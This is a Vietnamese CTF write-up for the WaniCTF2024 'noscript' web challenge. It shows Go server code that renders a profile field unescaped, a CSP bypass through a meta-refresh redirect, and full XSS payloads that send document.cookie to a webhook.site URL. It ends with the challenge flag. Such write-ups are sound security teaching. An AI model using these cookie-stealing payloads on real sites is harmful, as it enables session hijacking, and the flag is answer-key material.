# noscript 

![342672789-9df855ff-2f5e-4743-8c41-5501d0b120b8](https://github.com/LDV-SpaceK/WaniCTF2024/assets/152776722/35efa440-56e8-4896-becb-84d613e60f67)


![342685225-37a7d167-179c-4a2b-a4d0-e099324b7328](https://github.com/LDV-SpaceK/WaniCTF2024/assets/152776722/f85a60ea-40c2-4212-86d2-4189c9a9cb57)


- Recon:

  + khi ta check chức năng sign in thì có 1 thông tin về xss banner
 
  + check qua payload <script> tag có vẻ nó không hiện thông tin về script tag
 
=> check code 

```
	r.GET("/user/:id", func(c *gin.Context) {
		c.Header("Content-Security-Policy", "default-src 'self', script-src 'none'")
		id := c.Param("id")
		re := regexp.MustCompile("^[a-fA-F0-9]{8}-[a-fA-F0-9]{4}-4[a-fA-F0-9]{3}-[8|9|aA|bB][a-fA-F0-9]{3}-[a-fA-F0-9]{12}$")
		if re.MatchString(id) {
			if val, ok := db.Get(id); ok {
				params := map[string]interface{}{
					"id":       id,
					"username": val[0],
					"profile":  template.HTML(val[1]),  // vulnerable to XSS
				}
				c.HTML(http.StatusOK, "user.html", params)
			} else {
				_, _ = c.Writer.WriteString("<p>user not found <a href='/'>Home</a></p>")
			}
		} else {
			_, _ = c.Writer.WriteString("<p>invalid id <a href='/'>Home</a></p>")
		}
	})

```
+ "profile":  template.HTML(val[1]) : đang chứa lỗ hổng xss vì template chưa được lọc dữ liệu


=> chức năng này ta thấy csp đang chặn script thực thi nên ta sẽ sử dụng meta tag để chuyển hướng sang 1 trang khác 

```
// Get username API
	r.GET("/username/:id", func(c *gin.Context) {
		id := c.Param("id")
		re := regexp.MustCompile("^[a-fA-F0-9]{8}-[a-fA-F0-9]{4}-4[a-fA-F0-9]{3}-[8|9|aA|bB][a-fA-F0-9]{3}-[a-fA-F0-9]{12}$")
		if re.MatchString(id) {
			if val, ok := db.Get(id); ok {
				_, _ = c.Writer.WriteString(val[0])
			} else {
				_, _ = c.Writer.WriteString("<p>user not found <a href='/'>Home</a></p>")
			}
		} else {
			_, _ = c.Writer.WriteString("<p>invalid id <a href='/'>Home</a></p>")
		}
	})
```

=> chức năng username/id api fetch data ở đây 


=> profile là để thực thi script để di chuyển đến main injection là username api để fetch cookie  




payload 


```

username=<a+autofocus='true'+tabindex=1+id=x+onfocus=fetch('https://webhook.site/d87e3a45-c3e2-4738-a9e3-bec99d4a9d78',{method:'POST',mode:'no-cors',body:document.cookie})>#x</a>&profile=<meta+http-equiv="refresh"+content="0;url=http://app:8080/username/id">


username=<a+autofocus%3d'true'+tabindex%3d1+id%3dx+onfocus%3dfetch('https://webhook.site/d87e3a45-c3e2-4738-a9e3-bec99d4a9d78',{method%3a'POST',mode%3a'no-cors',body%3adocument.cookie
})>%23x</a>&profile=<meta+http-equiv%3d"refresh"+content%3d"0%3burl%3dhttp%3a//app%3a8080/username/id">

id => user/id
```

![341986279-4998bd31-c136-4f3b-8b21-322ecb65d470](https://github.com/LDV-SpaceK/WaniCTF2024/assets/152776722/f6a5fcd6-a679-4621-995d-258e68c1705b)

=> payload ngắn hơn:

    username=<script>fetch(`(webhook)?cookie=${document.cookie}`)</script>
    
    profile=<meta+http-equiv="refresh"+content="0;url=http://app:8080/username/id">


![341986251-de421aa8-c7b9-40dd-9168-a29afb7c74d4](https://github.com/LDV-SpaceK/WaniCTF2024/assets/152776722/c136c762-4494-4abf-91ee-fc5eb5d38cef)


=> flag:FLAG{n0scr1p4_c4n_be_d4nger0us}
